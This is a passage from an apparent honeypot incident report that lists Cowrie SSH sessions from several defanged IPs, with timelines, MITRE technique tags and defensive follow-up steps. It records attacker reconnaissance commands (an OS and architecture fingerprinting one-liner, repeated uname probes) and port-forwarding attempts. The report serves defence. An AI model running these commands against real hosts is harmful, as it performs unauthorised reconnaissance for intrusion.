- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-621c4ee8aba8

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]14` |
| **First Seen** | 2026-07-21 03:41 |
| **Last Seen** | 2026-07-21 03:41 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 03:41:25` | `cowrie.session.connect` |
| `2026-07-21 03:41:25` | `cowrie.client.version` |
| `2026-07-21 03:41:25` | `cowrie.client.kex` |
| `2026-07-21 03:41:27` | `cowrie.login.success` |
| `2026-07-21 03:41:29` | `cowrie.session.params` |
| `2026-07-21 03:41:29` | `cowrie.command.input` |
| `2026-07-21 03:41:29` | `cowrie.command.input` |
| `2026-07-21 03:41:29` | `cowrie.command.input` |
| `2026-07-21 03:41:29` | `cowrie.command.input` |
| `2026-07-21 03:41:29` | `cowrie.command.input` |
| `2026-07-21 03:41:29` | `cowrie.command.success` |
| `2026-07-21 03:41:29` | `cowrie.command.input` |
| `2026-07-21 03:41:29` | `cowrie.command.input` |
| `2026-07-21 03:41:29` | `cowrie.command.input` |
| `2026-07-21 03:41:29` | `cowrie.command.input` |
| `2026-07-21 03:41:29` | `cowrie.log.closed` |
| `2026-07-21 03:41:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]14` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-433e13c67ef0

| Field | Detail |
|---|---|
| **Source IP** | `185.242.3[.]195` |
| **First Seen** | 2026-07-21 03:43 |
| **Last Seen** | 2026-07-21 03:43 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 03:43:17` | `cowrie.session.connect` |
| `2026-07-21 03:43:17` | `cowrie.client.version` |
| `2026-07-21 03:43:18` | `cowrie.client.kex` |
| `2026-07-21 03:43:18` | `cowrie.login.success` |
| `2026-07-21 03:43:19` | `cowrie.session.params` |
| `2026-07-21 03:43:19` | `cowrie.command.input` |
| `2026-07-21 03:43:19` | `cowrie.log.closed` |
| `2026-07-21 03:43:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.242.3[.]195` to AbuseIPDB if not already reported
- [ ] Block `185.242.3[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d33a29d35b2d

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]14` |
| **First Seen** | 2026-07-21 03:43 |
| **Last Seen** | 2026-07-21 03:43 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 03:43:31` | `cowrie.session.connect` |
| `2026-07-21 03:43:32` | `cowrie.client.version` |
| `2026-07-21 03:43:32` | `cowrie.client.kex` |
| `2026-07-21 03:43:34` | `cowrie.login.success` |
| `2026-07-21 03:43:35` | `cowrie.session.params` |
| `2026-07-21 03:43:35` | `cowrie.command.input` |
| `2026-07-21 03:43:35` | `cowrie.command.input` |
| `2026-07-21 03:43:35` | `cowrie.command.input` |
| `2026-07-21 03:43:35` | `cowrie.command.input` |
| `2026-07-21 03:43:35` | `cowrie.command.input` |
| `2026-07-21 03:43:35` | `cowrie.command.success` |
| `2026-07-21 03:43:35` | `cowrie.command.input` |
| `2026-07-21 03:43:35` | `cowrie.command.input` |
| `2026-07-21 03:43:35` | `cowrie.command.input` |
| `2026-07-21 03:43:35` | `cowrie.command.input` |
| `2026-07-21 03:43:36` | `cowrie.log.closed` |
| `2026-07-21 03:43:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]14` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6703c7c0d025

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]14` |
| **First Seen** | 2026-07-21 03:45 |
| **Last Seen** | 2026-07-21 03:45 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 03:45:34` | `cowrie.session.connect` |
| `2026-07-21 03:45:34` | `cowrie.client.version` |
| `2026-07-21 03:45:34` | `cowrie.client.kex` |
| `2026-07-21 03:45:37` | `cowrie.login.success` |
| `2026-07-21 03:45:38` | `cowrie.session.params` |
| `2026-07-21 03:45:38` | `cowrie.command.input` |
| `2026-07-21 03:45:38` | `cowrie.command.input` |
| `2026-07-21 03:45:38` | `cowrie.command.input` |
| `2026-07-21 03:45:38` | `cowrie.command.input` |
| `2026-07-21 03:45:38` | `cowrie.command.input` |
| `2026-07-21 03:45:38` | `cowrie.command.success` |
| `2026-07-21 03:45:38` | `cowrie.command.input` |
| `2026-07-21 03:45:38` | `cowrie.command.input` |
| `2026-07-21 03:45:38` | `cowrie.command.input` |
| `2026-07-21 03:45:38` | `cowrie.command.input` |
| `2026-07-21 03:45:39` | `cowrie.log.closed` |
| `2026-07-21 03:45:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]14` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-656da0b172f3

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]14` |
| **First Seen** | 2026-07-21 03:47 |
| **Last Seen** | 2026-07-21 03:47 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 03:47:41` | `cowrie.session.connect` |
| `2026-07-21 03:47:41` | `cowrie.client.version` |
| `2026-07-21 03:47:41` | `cowrie.client.kex` |
| `2026-07-21 03:47:43` | `cowrie.login.success` |
| `2026-07-21 03:47:45` | `cowrie.session.params` |
| `2026-07-21 03:47:45` | `cowrie.command.input` |
| `2026-07-21 03:47:45` | `cowrie.command.input` |
| `2026-07-21 03:47:45` | `cowrie.command.input` |
| `2026-07-21 03:47:45` | `cowrie.command.input` |
| `2026-07-21 03:47:45` | `cowrie.command.input` |
| `2026-07-21 03:47:45` | `cowrie.command.success` |
| `2026-07-21 03:47:45` | `cowrie.command.input` |
| `2026-07-21 03:47:45` | `cowrie.command.input` |
| `2026-07-21 03:47:45` | `cowrie.command.input` |
| `2026-07-21 03:47:45` | `cowrie.command.input` |
| `2026-07-21 03:47:46` | `cowrie.log.closed` |
| `2026-07-21 03:47:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]14` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c8bb8f9ca656

| Field | Detail |
|---|---|
| **Source IP** | `58.57.154[.]146` |
| **First Seen** | 2026-07-21 03:49 |
| **Last Seen** | 2026-07-21 03:49 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 03:49:45` | `cowrie.session.connect` |
| `2026-07-21 03:49:45` | `cowrie.client.version` |
| `2026-07-21 03:49:45` | `cowrie.client.kex` |
| `2026-07-21 03:49:47` | `cowrie.login.success` |
| `2026-07-21 03:49:47` | `cowrie.direct-tcpip.request` |
| `2026-07-21 03:49:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `58.57.154[.]146` to AbuseIPDB if not already reported
- [ ] Block `58.57.154[.]146` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-70087caa88ae

| Field | Detail |
|---|---|
| **Source IP** | `178.178.194[.]136` |
| **First Seen** | 2026-07-21 03:49 |
| **Last Seen** | 2026-07-21 03:49 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 03:49:52` | `cowrie.session.connect` |
| `2026-07-21 03:49:53` | `cowrie.client.version` |
| `2026-07-21 03:49:53` | `cowrie.client.kex` |
| `2026-07-21 03:49:54` | `cowrie.login.success` |
| `2026-07-21 03:49:55` | `cowrie.direct-tcpip.request` |
| `2026-07-21 03:49:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `178.178.194[.]136` to AbuseIPDB if not already reported
- [ ] Block `178.178.194[.]136` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7d4ab031b84e

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]14` |
| **First Seen** | 2026-07-21 03:50 |
| **Last Seen** | 2026-07-21 03:50 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 03:50:02` | `cowrie.session.connect` |
| `2026-07-21 03:50:03` | `cowrie.client.version` |
| `2026-07-21 03:50:03` | `cowrie.client.kex` |
| `2026-07-21 03:50:07` | `cowrie.login.success` |
| `2026-07-21 03:50:09` | `cowrie.session.params` |
| `2026-07-21 03:50:09` | `cowrie.command.input` |
| `2026-07-21 03:50:09` | `cowrie.command.input` |
| `2026-07-21 03:50:09` | `cowrie.command.input` |
| `2026-07-21 03:50:09` | `cowrie.command.input` |
| `2026-07-21 03:50:09` | `cowrie.command.input` |
| `2026-07-21 03:50:09` | `cowrie.command.success` |
| `2026-07-21 03:50:09` | `cowrie.command.input` |
| `2026-07-21 03:50:10` | `cowrie.command.input` |
| `2026-07-21 03:50:10` | `cowrie.command.input` |
| `2026-07-21 03:50:10` | `cowrie.command.input` |
| `2026-07-21 03:50:10` | `cowrie.log.closed` |
| `2026-07-21 03:50:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]14` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6ace8cd9fac4

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]36` |
| **First Seen** | 2026-07-21 03:53 |
| **Last Seen** | 2026-07-21 03:53 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 03:53:35` | `cowrie.session.connect` |
| `2026-07-21 03:53:35` | `cowrie.client.version` |
| `2026-07-21 03:53:35` | `cowrie.client.kex` |
| `2026-07-21 03:53:37` | `cowrie.login.success` |
| `2026-07-21 03:53:38` | `cowrie.session.params` |
| `2026-07-21 03:53:38` | `cowrie.command.input` |
| `2026-07-21 03:53:39` | `cowrie.log.closed` |
| `2026-07-21 03:53:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]36` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]36` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e89986c9933d

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]36` |
| **First Seen** | 2026-07-21 03:53 |
| **Last Seen** | 2026-07-21 03:53 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 03:53:40` | `cowrie.session.connect` |
| `2026-07-21 03:53:41` | `cowrie.client.version` |
| `2026-07-21 03:53:41` | `cowrie.client.kex` |
| `2026-07-21 03:53:43` | `cowrie.login.success` |
| `2026-07-21 03:53:45` | `cowrie.session.params` |
| `2026-07-21 03:53:45` | `cowrie.command.input` |
| `2026-07-21 03:53:45` | `cowrie.log.closed` |
| `2026-07-21 03:53:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]36` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]36` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d467d64b6d74

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]36` |
| **First Seen** | 2026-07-21 03:53 |
| **Last Seen** | 2026-07-21 03:53 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 03:53:46` | `cowrie.session.connect` |
| `2026-07-21 03:53:46` | `cowrie.client.version` |
| `2026-07-21 03:53:46` | `cowrie.client.kex` |
| `2026-07-21 03:53:48` | `cowrie.login.success` |
| `2026-07-21 03:53:50` | `cowrie.session.params` |
| `2026-07-21 03:53:50` | `cowrie.command.input` |
| `2026-07-21 03:53:50` | `cowrie.log.closed` |
| `2026-07-21 03:53:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]36` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]36` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d89d58257ddc

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]36` |
| **First Seen** | 2026-07-21 03:53 |
| **Last Seen** | 2026-07-21 03:53 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 03:53:51` | `cowrie.session.connect` |
| `2026-07-21 03:53:51` | `cowrie.client.version` |
| `2026-07-21 03:53:51` | `cowrie.client.kex` |
| `2026-07-21 03:53:52` | `cowrie.login.success` |
| `2026-07-21 03:53:53` | `cowrie.session.params` |
| `2026-07-21 03:53:53` | `cowrie.command.input` |
| `2026-07-21 03:53:53` | `cowrie.log.closed` |
| `2026-07-21 03:53:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]36` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]36` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7a863cd495d9

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]36` |
| **First Seen** | 2026-07-21 03:53 |
| **Last Seen** | 2026-07-21 03:53 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 03:53:56` | `cowrie.session.connect` |
| `2026-07-21 03:53:56` | `cowrie.client.version` |
| `2026-07-21 03:53:57` | `cowrie.client.kex` |
| `2026-07-21 03:53:57` | `cowrie.login.success` |
| `2026-07-21 03:53:58` | `cowrie.session.params` |
| `2026-07-21 03:53:58` | `cowrie.command.input` |
| `2026-07-21 03:53:58` | `cowrie.log.closed` |
| `2026-07-21 03:53:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]36` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]36` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-713cea81cb81

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]36` |
| **First Seen** | 2026-07-21 03:54 |
| **Last Seen** | 2026-07-21 03:54 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 03:54:02` | `cowrie.session.connect` |
| `2026-07-21 03:54:02` | `cowrie.client.version` |
| `2026-07-21 03:54:02` | `cowrie.client.kex` |
| `2026-07-21 03:54:02` | `cowrie.login.success` |
| `2026-07-21 03:54:03` | `cowrie.session.params` |
| `2026-07-21 03:54:03` | `cowrie.command.input` |
| `2026-07-21 03:54:03` | `cowrie.log.closed` |
| `2026-07-21 03:54:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]36` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]36` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1e11acf49e0b

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]14` |
| **First Seen** | 2026-07-21 03:54 |
| **Last Seen** | 2026-07-21 03:54 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 03:54:04` | `cowrie.session.connect` |
| `2026-07-21 03:54:04` | `cowrie.client.version` |
| `2026-07-21 03:54:04` | `cowrie.client.kex` |
| `2026-07-21 03:54:08` | `cowrie.login.success` |
| `2026-07-21 03:54:11` | `cowrie.session.params` |
| `2026-07-21 03:54:11` | `cowrie.command.input` |
| `2026-07-21 03:54:11` | `cowrie.command.input` |
| `2026-07-21 03:54:11` | `cowrie.command.input` |
| `2026-07-21 03:54:11` | `cowrie.command.input` |
| `2026-07-21 03:54:11` | `cowrie.command.input` |
| `2026-07-21 03:54:11` | `cowrie.command.success` |
| `2026-07-21 03:54:11` | `cowrie.command.input` |
| `2026-07-21 03:54:11` | `cowrie.command.input` |
| `2026-07-21 03:54:11` | `cowrie.command.input` |
| `2026-07-21 03:54:11` | `cowrie.command.input` |
| `2026-07-21 03:54:12` | `cowrie.log.closed` |
| `2026-07-21 03:54:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]14` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c51aa8f1ae7a

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]36` |
| **First Seen** | 2026-07-21 03:54 |
| **Last Seen** | 2026-07-21 03:54 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 03:54:07` | `cowrie.session.connect` |
| `2026-07-21 03:54:07` | `cowrie.client.version` |
| `2026-07-21 03:54:07` | `cowrie.client.kex` |
| `2026-07-21 03:54:08` | `cowrie.login.success` |
| `2026-07-21 03:54:08` | `cowrie.session.params` |
| `2026-07-21 03:54:08` | `cowrie.command.input` |
| `2026-07-21 03:54:08` | `cowrie.log.closed` |
| `2026-07-21 03:54:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]36` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]36` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e6ba2b9bf6b6

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]36` |
| **First Seen** | 2026-07-21 03:54 |
| **Last Seen** | 2026-07-21 03:54 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 03:54:12` | `cowrie.session.connect` |
| `2026-07-21 03:54:12` | `cowrie.client.version` |
| `2026-07-21 03:54:12` | `cowrie.client.kex` |
| `2026-07-21 03:54:13` | `cowrie.login.success` |
| `2026-07-21 03:54:13` | `cowrie.session.params` |
| `2026-07-21 03:54:13` | `cowrie.command.input` |
| `2026-07-21 03:54:14` | `cowrie.log.closed` |
| `2026-07-21 03:54:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]36` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]36` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9499f703e866

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]36` |
| **First Seen** | 2026-07-21 03:54 |
| **Last Seen** | 2026-07-21 03:54 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 03:54:17` | `cowrie.session.connect` |
| `2026-07-21 03:54:17` | `cowrie.client.version` |
| `2026-07-21 03:54:17` | `cowrie.client.kex` |
| `2026-07-21 03:54:18` | `cowrie.login.success` |
| `2026-07-21 03:54:19` | `cowrie.session.params` |
| `2026-07-21 03:54:19` | `cowrie.command.input` |
| `2026-07-21 03:54:19` | `cowrie.log.closed` |
| `2026-07-21 03:54:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]36` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]36` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c4dfd4449744

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]36` |
| **First Seen** | 2026-07-21 03:54 |
| **Last Seen** | 2026-07-21 03:54 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 03:54:22` | `cowrie.session.connect` |
| `2026-07-21 03:54:22` | `cowrie.client.version` |
| `2026-07-21 03:54:22` | `cowrie.client.kex` |
| `2026-07-21 03:54:22` | `cowrie.login.success` |
| `2026-07-21 03:54:23` | `cowrie.session.params` |
| `2026-07-21 03:54:23` | `cowrie.command.input` |
| `2026-07-21 03:54:23` | `cowrie.log.closed` |
| `2026-07-21 03:54:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]36` to AbuseIPDB if not already reported
